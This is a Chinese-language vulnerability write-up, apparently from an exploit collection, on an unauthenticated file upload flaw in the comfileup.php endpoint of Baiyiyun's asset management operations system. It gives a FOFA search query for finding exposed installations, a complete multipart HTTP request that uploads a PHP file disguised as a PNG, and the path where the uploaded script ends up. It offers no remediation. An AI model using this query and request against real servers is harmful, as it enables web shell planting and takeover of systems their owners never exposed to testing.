# 资产管理运营系统comfileup前台文件上传漏洞

# 一、漏洞简介
湖南众合百易信息技术有限公司（简称：百易云）成立于2017年是一家专注于不动产领域数字化研发及服务的国家高新技术企业，公司拥有不动产领域的数字化全面解决方案、覆盖住宅、写字楼、商业中心、专业市场、产业园区、公建、后勤等多种业态、通过数字化帮助企业实现数字化转型，有效提高公司管理水平及业务办理效率、降低运营成本，公司自成立以来，已帮助众多企业实现数字化转型。资产管理运营系统comfileup前台文件上传漏洞

# 二、影响版本
+ 资产管理运营系统

# 三、资产测绘
+ fofa`body="media/css/uniform.default.css" && body="资管云"`
+ 特征

![1721891230963-ab71a358-6ed2-4ca8-9c97-c78fd2421899.png](./img/Wqde2Cpvw4X5b-Ms/1721891230963-ab71a358-6ed2-4ca8-9c97-c78fd2421899-329885.png)

# 四、漏洞复现
```plain
POST /comfileup.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: ASP.NET_SessionId=vkp4usonpxcstreczz05g113
Accept: */*
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Length: 35827

-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

123
-----------------------------289666258334735365651210512949--
```

![1721891324618-765acd68-6008-42a7-a922-189de659276e.png](./img/Wqde2Cpvw4X5b-Ms/1721891324618-765acd68-6008-42a7-a922-189de659276e-617875.png)

```plain
/uploads/202407/0725/20240725-66a1f85ecfb2c.php
```

![1721891373679-8062bf4f-2c05-47bb-a7df-4ecad4c32900.png](./img/Wqde2Cpvw4X5b-Ms/1721891373679-8062bf4f-2c05-47bb-a7df-4ecad4c32900-079718.png)



> 更新: 2024-08-12 17:15:59  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hkdpgnqni0idpkxy>